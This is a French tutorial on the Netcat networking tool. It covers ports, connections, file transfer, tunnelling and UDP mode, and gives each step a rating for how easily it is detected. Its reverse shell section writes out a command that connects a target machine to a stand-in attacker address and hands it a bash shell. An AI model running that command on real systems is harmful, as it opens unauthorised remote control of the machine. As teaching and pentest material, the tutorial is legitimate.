# 😁 Netcat

#### Introduction

Netcat, souvent surnommé "le couteau suisse des réseaux", est un outil polyvalent et puissant utilisé pour la gestion des connexions réseau. Il peut être utilisé pour diverses tâches telles que l'écoute sur des ports, la connexion à des hôtes distants, le transfert de fichiers, et la création de tunnels. Netcat supporte à la fois les protocoles TCP et UDP, ce qui le rend extrêmement utile dans des scénarios de dépannage réseau, de tests de pénétration et de développement. Ce tutoriel vous guidera à travers les étapes d'installation et d'utilisation de Netcat sur les systèmes Linux et Windows.

**Installation sur Linux**

1.  **Installer via apt (pour les distributions basées sur Debian)** :

    ```bash
    sudo apt update
    sudo apt install netcat
    ```

    * **Explication** :
      * `sudo apt update` : Met à jour la liste des paquets disponibles.
      * `sudo apt install netcat` : Installe Netcat via le gestionnaire de paquets `apt`.

**Installation sur Windows**

1. **Télécharger Netcat depuis nmap.org ou** [**netcat.sourceforge.net**](http://netcat.sourceforge.net/).
   * **Explication** : Téléchargez et décompressez l'archive, puis placez l'exécutable dans un répertoire accessible.

#### Utilisation de Base

**1. Écoute d’un Port**

1.  **Lancer Netcat pour écouter sur un port spécifique** :

    ```bash
    nc -l -p 1234
    ```

    * **Explication** :
      * `-l` : Met Netcat en mode écoute (listening).
      * `-p 1234` : Spécifie le port sur lequel Netcat écoutera les connexions (port 1234 dans cet exemple).
    * **Discrétion** : Moyenne. Écouter sur un port peut être détecté par les systèmes de surveillance réseau.
2.  **Exemple avec une adresse IP spécifique** :

    ```bash
    nc -l -p 1234 -s 192.168.1.100
    ```

    * **Explication** :
      * `-s 192.168.1.100` : Spécifie l'adresse IP sur laquelle écouter.
    * **Discrétion** : Moyenne. L'écoute sur une IP spécifique peut également être détectée.

**2. Connexion à un Hôte**

1.  **Se connecter à un serveur sur un port spécifique** :

    ```bash
    nc example.com 1234
    ```

    * **Explication** :
      * `example.com` : L'adresse de l'hôte auquel se connecter.
      * `1234` : Le port sur lequel se connecter.
    * **Discrétion** : Moyenne. La connexion à un hôte peut être détectée par les systèmes de surveillance réseau.
2.  **Connexion avec une adresse IP spécifique** :

    ```bash
    nc 192.168.1.100 1234
    ```

**3. Transfert de Fichiers**

1. **Envoyer un fichier à travers une connexion Netcat** :
   *   **Sur l’hôte récepteur (écouteur)** :

       ```bash
       nc -l -p 1234 > received_file.txt
       ```

       * **Explication** : Le fichier reçu sera enregistré en tant que `received_file.txt`.
       * **Discrétion** : Moyenne. Le transfert de fichiers peut être détecté.
   *   **Sur l’hôte émetteur (expéditeur)** :

       ```bash
       nc example.com 1234 < file_to_send.txt
       ```

       * **Explication** : `file_to_send.txt` est le fichier à envoyer.

**4. Création d’un Tunnel**

1.  **Créer un tunnel pour rediriger un port local vers un port distant** :

    ```bash
    nc -l -p 1234 | nc example.com 5678
    ```

    * **Explication** : Cette commande redirige le trafic du port 1234 local vers le port 5678 sur `example.com`.
    * **Discrétion** : Moyenne à faible. La création de tunnels peut être détectée par les systèmes de surveillance réseau.

**5. Scénario de Reverse Shell**

1.  **Écouter sur un port (sur l’attaquant)** :

    ```bash
    nc -l -p 1234
    ```
2.  **Lancer un reverse shell (sur la machine cible)** :

    ```bash
    nc attacker_ip 1234 -e /bin/bash
    ```

    * **Explication** :
      * `attacker_ip` : Adresse IP de l'attaquant.
      * `-e /bin/bash` : Exécute `/bin/bash` pour fournir un shell interactif.
    * **Discrétion** : Faible. Les reverse shells sont souvent détectés par les systèmes de sécurité.

#### Options Avancées

**1. Mode UDP**

1.  **Écouter sur un port UDP** :

    ```bash
    nc -u -l -p 1234
    ```

    * **Explication** :
      * `-u` : Utilise le protocole UDP au lieu de TCP.
    * **Discrétion** : Moyenne. Les connexions UDP peuvent être surveillées.
2.  **Se connecter via UDP** :

    ```bash
    nc -u example.com 1234
    ```

**2. Mode Verbose**

1.  **Activer le mode verbose pour plus d’informations** :

    ```bash
    nc -v -l -p 1234
    ```

    * **Explication** :
      * `-v` : Active le mode verbose pour afficher des informations supplémentaires.
    * **Discrétion** : Moyenne. Le mode verbose affiche des informations supplémentaires mais n'affecte pas la détection des connexions.

#### Discrétion

**Discrétion** : Moyenne à faible. Netcat est souvent utilisé pour des tâches légitimes, mais il peut également être utilisé pour des activités malveillantes telles que des reverse shells. Utilise Netcat de manière responsable et dans des environnements où tu as l'autorisation. Les connexions et les activités générées par Netcat peuvent être surveillées par les systèmes de sécurité réseau.
